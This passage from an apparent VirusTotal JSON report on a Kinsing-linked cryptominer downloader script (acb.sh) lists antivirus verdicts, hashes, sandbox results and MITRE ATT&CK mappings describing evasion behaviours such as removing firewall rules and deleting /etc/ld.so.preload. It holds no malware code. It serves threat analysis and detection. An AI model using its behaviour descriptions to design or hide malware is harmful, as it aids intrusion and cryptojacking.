          "result": "Win32.Trojan-Downloader.Miner.Bdhl",
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "Sophos": {
          "category": "malicious",
          "engine_name": "Sophos",
          "engine_version": "2.4.3.0",
          "result": "Troj/Dloadr-EFZ",
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "F-Secure": {
          "category": "malicious",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "result": "Malware.LINUX/Miner.G",
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "VIPRE": {
          "category": "malicious",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": "Generic.Linux.Zojfor.C.F3AA21D0",
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "TrendMicro": {
          "category": "malicious",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": "Trojan.SH.CVE20207961.SM",
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "SentinelOne": {
          "category": "type-unsupported",
          "engine_name": "SentinelOne",
          "engine_version": "23.4.2.3",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231119"
        },
        "Trapmine": {
          "category": "type-unsupported",
          "engine_name": "Trapmine",
          "engine_version": "4.0.14.97",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231106"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230822"
        },
        "Emsisoft": {
          "category": "malicious",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": "Generic.Linux.Zojfor.C.F3AA21D0 (B)",
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "Paloalto": {
          "category": "type-unsupported",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "240101-00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "Webroot": {
          "category": "type-unsupported",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "Google": {
          "category": "malicious",
          "engine_name": "Google",
          "engine_version": "1704132025",
          "result": "Detected",
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "Avira": {
          "category": "malicious",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": "LINUX/Miner.G",
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "MAX": {
          "category": "malicious",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": "malware (ai score=84)",
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "Antiy-AVL": {
          "category": "undetected",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "Kingsoft": {
          "category": "malicious",
          "engine_name": "Kingsoft",
          "engine_version": "None",
          "result": "Win32.Troj.Undef.a",
          "method": "blacklist",
          "engine_update": "20230906"
        },
        "Gridinsoft": {
          "category": "undetected",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.153.174",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "Xcitium": {
          "category": "undetected",
          "engine_name": "Xcitium",
          "engine_version": "36309",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "Microsoft": {
          "category": "malicious",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23110.2",
          "result": "Trojan:Linux/CoinMiner.AF!MTB",
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "ZoneAlarm": {
          "category": "malicious",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": "HEUR:Trojan-Downloader.Shell.Miner.gen",
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "A:25.37081B:27.34410",
          "result": "Generic.Linux.Zojfor.C.F3AA21D0",
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "Varist": {
          "category": "malicious",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "result": "ABRisk.JKYT-3",
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231230"
        },
        "AhnLab-V3": {
          "category": "malicious",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.25.0.10459",
          "result": "Downloader/Shell.Kinsing.S1443",
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230828"
        },
        "ALYac": {
          "category": "malicious",
          "engine_name": "ALYac",
          "engine_version": "1.1.3.1",
          "result": "Trojan.Downloader.Shell.Agent",
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2024-01-01.02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "DeepInstinct": {
          "category": "type-unsupported",
          "engine_name": "DeepInstinct",
          "engine_version": "3.1.0.15",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231224"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "Cylance": {
          "category": "type-unsupported",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231108"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "Rising": {
          "category": "malicious",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": "Downloader.Kinsing/BASH!1.DE6A (CLASSIC)",
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "Yandex": {
          "category": "undetected",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "result": "Trojan.Linux.Coinminer",
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "MaxSecure": {
          "category": "undetected",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231230"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": "BASH/Miner.BPH!tr",
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "result": "BV:Agent-BPH [Trj]",
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "CrowdStrike": {
          "category": "type-unsupported",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231026"
        }
      },
      "trid": [
        {
          "file_type": "Linux/UNIX shell script",
          "probability": 100
        }
      ],
      "sigma_analysis_summary": {
        "Sigma Integrated Rule Set (GitHub)": {
          "high": 1,
          "medium": 1,
          "critical": 0,
          "low": 0
        }
      },
      "sandbox_verdicts": {
        "Zenbox Linux": {
          "category": "malicious",
          "confidence": 68,
          "sandbox_name": "Zenbox Linux",
          "malware_classification": [
            "MALWARE",
            "EVADER"
          ],
          "malware_names": [
            "Kinsing Downloader"
          ]
        }
      },
      "sha256": "0cc60a0c480e4d898fa77ab501bbd2afaf3f5fb89a2917a31e7f5fdaa6c3879c",
      "type_extension": "sh",
      "tags": [
        "shell",
        "cve-2020-7961",
        "checks-hostname",
        "sudo",
        "detect-debug-environment",
        "exploit"
      ],
      "last_analysis_date": 1704136783,
      "unique_sources": 3,
      "first_submission_date": 1700136647,
      "ssdeep": "384:X5Jh2lH2wx2vUaQa5/e867USbRfqB+A8kWT4yCtvUsDjdWOhJw/:Ji7YJDj8OhJw/",
      "md5": "cb93528a1ca950307c4f14b48a93564b",
      "sha1": "ee828745dd6e37ecc35c0287a51addd30de8ffe6",
      "magic": "Bourne-Again shell script, ASCII text executable, with very long lines (363u)",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 15,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 1,
        "malicious": 37,
        "undetected": 23
      },
      "meaningful_name": "acb.sh",
      "reputation": 0,
      "sigma_analysis_stats": {
        "high": 1,
        "medium": 1,
        "critical": 0,
        "low": 0
      }
    },
    "type": "file",
    "id": "0cc60a0c480e4d898fa77ab501bbd2afaf3f5fb89a2917a31e7f5fdaa6c3879c",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/0cc60a0c480e4d898fa77ab501bbd2afaf3f5fb89a2917a31e7f5fdaa6c3879c"
    }
  },
  "mitre": {
    "data": {
      "Zenbox Linux": {
        "tactics": [
          {
            "description": "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ",
            "techniques": [
              {
                "description": "Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. \nWhen used maliciously, LKMs can be a type of kernel-mode Rootkit that run with the highest operating system privilege (Ring 0). Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors, and enabling root access to non-privileged users.\nKernel extensions, also called kext, are used in macOS to load functionality onto a system similar to LKMs for Linux. Since the kernel is responsible for enforcing security and the kernel extensions run as apart of the kernel, kexts are not governed by macOS security policies. Kexts are loaded and unloaded through kextload and kextunload commands. Kexts need to be signed with a developer ID that is granted privileges by Apple allowing it to sign Kernel extensions. Developers without these privileges may still sign kexts but they will not load unless SIP is disabled. If SIP is enabled, the kext signature is verified before being added to the AuxKC.\nSince macOS Catalina 10.15, kernel extensions have been deprecated in favor of System Extensions. However, kexts are still allowed as \"Legacy System Extensions\" since there is no System Extension for Kernel Programming Interfaces.\nAdversaries can use LKMs and kexts to conduct Persistence and/or Privilege Escalation on a system. Examples have been found in the wild, and there are some relevant open source projects as well.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes the \"modprobe\" command used for loading kernel modules"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1547/006/",
                "id": "T1547.006",
                "name": "Kernel Modules and Extensions"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0003/",
            "id": "TA0003",
            "name": "Persistence"
          },
          {
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "This technique has been deprecated. Please use Command and Scripting Interpreter where appropriate.\nAdversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in Spearphishing Attachment and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through Exploitation for Client Execution, where adversaries will rely on macros being allowed or that the user will accept to activate them.\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit , Veil , and PowerSploit  are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. ",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Found strings indicative of a multi-platform dropper"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1064/",
                "id": "T1064",
                "name": "Scripting"
              },
              {
                "description": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.\nThere are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript and Visual Basic.\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various Remote Services in order to achieve remote Execution.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes the \"sed\" command used to modify input streams (typically from files or pipes)"
                  },
                  {
                    "severity": "INFO",
                    "description": "Sample contains strings that are potentially command strings"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1059/",
                "id": "T1059",
                "name": "Command and Scripting Interpreter"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          },
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nExample commands that can be used to obtain security software information are netsh, reg query with Reg, dir with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\nAdversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment. For example, the permitted IP ranges, ports or user accounts for the inbound/outbound rules of security groups, virtual firewalls established within AWS for EC2 and/or VPC instances, can be revealed by the DescribeSecurityGroups action with various request parameters. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Uses the \"uname\" system call to query kernel version information (possible evasion)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1518/001/",
                "id": "T1518.001",
                "name": "Security Software Discovery"
              },
              {
                "description": "Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. show ip route, show ip interface).\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes the \"iptables\" command used for managing IP filtering and manipulation"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1016/",
                "id": "T1016",
                "name": "System Network Configuration Discovery"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory’s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Accessibility Features, Boot or Logon Initialization Scripts, Unix Shell Configuration Modification, or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Removes protection from files"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1222/",
                "id": "T1222",
                "name": "File and Directory Permissions Modification"
              },
              {
                "description": "This technique has been deprecated. Please use Command and Scripting Interpreter where appropriate.\nAdversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in Spearphishing Attachment and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through Exploitation for Client Execution, where adversaries will rely on macros being allowed or that the user will accept to activate them.\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit , Veil , and PowerSploit  are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. ",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Found strings indicative of a multi-platform dropper"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1064/",
                "id": "T1064",
                "name": "Scripting"
              },
              {
                "description": "Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include del on Windows and rm or unlink on Linux and macOS.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes the \"rm\" command used to delete files or directories"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1070/004/",
                "id": "T1070.004",
                "name": "File Deletion"
              },
              {
                "description": "Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.\nModifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. Non-Standard Port).",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Sample removes firewall rules"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1562/004/",
                "id": "T1562.004",
                "name": "Disable or Modify System Firewall"
              },
              {
                "description": "Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.\nAdversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for Security Software Discovery. The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.\nThere have also been examples of vulnerabilities in public cloud infrastructure of SaaS applications that may bypass defense boundaries , evade security logs , or deploy hidden infrastructure.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Deletes /etc/ld.so.preload (likely AV evasion)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1211/",
                "id": "T1211",
                "name": "Exploitation for Defense Evasion"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          },
          {
            "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
            "techniques": [
              {
                "description": "Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. \nWhen used maliciously, LKMs can be a type of kernel-mode Rootkit that run with the highest operating system privilege (Ring 0). Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors, and enabling root access to non-privileged users.\nKernel extensions, also called kext, are used in macOS to load functionality onto a system similar to LKMs for Linux. Since the kernel is responsible for enforcing security and the kernel extensions run as apart of the kernel, kexts are not governed by macOS security policies. Kexts are loaded and unloaded through kextload and kextunload commands. Kexts need to be signed with a developer ID that is granted privileges by Apple allowing it to sign Kernel extensions. Developers without these privileges may still sign kexts but they will not load unless SIP is disabled. If SIP is enabled, the kext signature is verified before being added to the AuxKC.\nSince macOS Catalina 10.15, kernel extensions have been deprecated in favor of System Extensions. However, kexts are still allowed as \"Legacy System Extensions\" since there is no System Extension for Kernel Programming Interfaces.\nAdversaries can use LKMs and kexts to conduct Persistence and/or Privilege Escalation on a system. Examples have been found in the wild, and there are some relevant open source projects as well.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes the \"modprobe\" command used for loading kernel modules"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1547/006/",
                "id": "T1547.006",
                "name": "Kernel Modules and Extensions"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0004/",
            "id": "TA0004",
            "name": "Privilege Escalation"
          }
        ]
      },
      "OS X Sandbox": {
        "tactics": [
          {
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "This technique has been deprecated. Please use Command and Scripting Interpreter where appropriate.\nAdversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in Spearphishing Attachment and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through Exploitation for Client Execution, where adversaries will rely on macros being allowed or that the user will accept to activate them.\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit , Veil , and PowerSploit  are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. ",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Found strings indicative of a multi-platform dropper"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1064/",
                "id": "T1064",
                "name": "Scripting"
              },
              {
                "description": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.\nThere are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript and Visual Basic.\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various Remote Services in order to achieve remote Execution.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes the \"awk\" command used to scan for patterns (typically in standard output)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1059/",
                "id": "T1059",
                "name": "Command and Scripting Interpreter"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          },
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Reads hardware related sysctl values"
                  },
                  {
                    "severity": "INFO",
                    "description": "Reads the systems hostname"
                  },
                  {
                    "severity": "INFO",
                    "description": "Executes the \"uname\" command used to read OS and architecture name"
                  },
                  {
                    "severity": "INFO",
                    "description": "Reads the system or server version plist file"
                  },
                  {
                    "severity": "INFO",
                    "description": "Reads the sysctl hardware model value (might be used for detecting VM presence)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1082/",
                "id": "T1082",
                "name": "System Information Discovery"
              },
              {
                "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.\nOn network devices, Network Device CLI commands such as show processes can be used to display current running processes.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes the \"ps\" command used to list the status of processes"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1057/",
                "id": "T1057",
                "name": "Process Discovery"
              },
              {
                "description": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nExample commands that can be used to obtain security software information are netsh, reg query with Reg, dir with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\nAdversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment. For example, the permitted IP ranges, ports or user accounts for the inbound/outbound rules of security groups, virtual firewalls established within AWS for EC2 and/or VPC instances, can be revealed by the DescribeSecurityGroups action with various request parameters. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Reads the sysctl hardware model value (might be used for detecting VM presence)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1518/001/",
                "id": "T1518.001",
                "name": "Security Software Discovery"
              },
              {
